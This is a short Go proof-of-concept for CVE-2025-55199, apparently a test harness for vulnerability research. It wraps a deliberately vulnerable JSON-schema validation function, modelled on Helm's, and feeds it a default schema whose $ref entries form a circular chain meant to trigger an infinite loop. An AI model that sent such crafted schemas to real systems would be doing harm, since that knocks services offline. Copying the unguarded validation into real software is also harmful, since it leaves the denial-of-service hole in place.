// CVE-2025-55199
// https://github.com/helm/helm/commit/b78692c18f0fb38fe5ba4571a674de067a4c53a5
package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/xeipuuv/gojsonschema"
)

// ValidateAgainstSingleSchema checks that values does not violate the structure laid out in this schema
func VulnerableValidateAgainstSingleSchema(schemaJson []byte) (err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("unable to validate schema: %s", r)
		}
	}()

	data := `{"secret": "value"}`

	fmt.Printf("Processing schema: %s\n", string(schemaJson))

	schmeaLoader := gojsonschema.NewBytesLoader(schemaJson)
	valuesLoader := gojsonschema.NewStringLoader(data)

	// 실제 취약점: 단순히 한 번의 검증에서 순환 참조로 인한 무한 루프 발생
	result, err := gojsonschema.Validate(schmeaLoader, valuesLoader)
	if err != nil {
		return err
	}

	if !result.Valid() {
		var sb strings.Builder
		for _, desc := range result.Errors() {
			sb.WriteString(fmt.Sprintf("%s\n", desc))
		}
		return fmt.Errorf("invalid values: %s", sb.String())
	}

	return nil
}

func main() {
	fmt.Println("CVE-2025-55199 JSON Schema Circular Reference Vulnerability Test")

	var schemaInput []byte

	if len(os.Args) > 1 {
		schemaInput = []byte(os.Args[1])
		fmt.Printf("Using schema from command line argument\n")
	} else if envSchema := os.Getenv("SCHEMA_INPUT"); envSchema != "" {
		schemaInput = []byte(envSchema)
		fmt.Printf("Using schema from environment variable\n")
	} else {
		schemaInput = []byte(`{
			"type": "object",
			"properties": {
				"a": {"$ref": "#/properties/b"},
				"b": {"$ref": "#/properties/c"},
				"c": {"$ref": "#/properties/d"},
				"d": {"$ref": "#/properties/a"}
			}
		}`)
		fmt.Printf("Using default complex circular reference schema\n")
	}

	fmt.Printf("Starting validation with schema size: %d bytes\n", len(schemaInput))

	err := VulnerableValidateAgainstSingleSchema(schemaInput)
	if err != nil {
		fmt.Printf("Validation error: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("Schema validation completed successfully")
	fmt.Println("If you see this message, the circular reference attack failed")
}
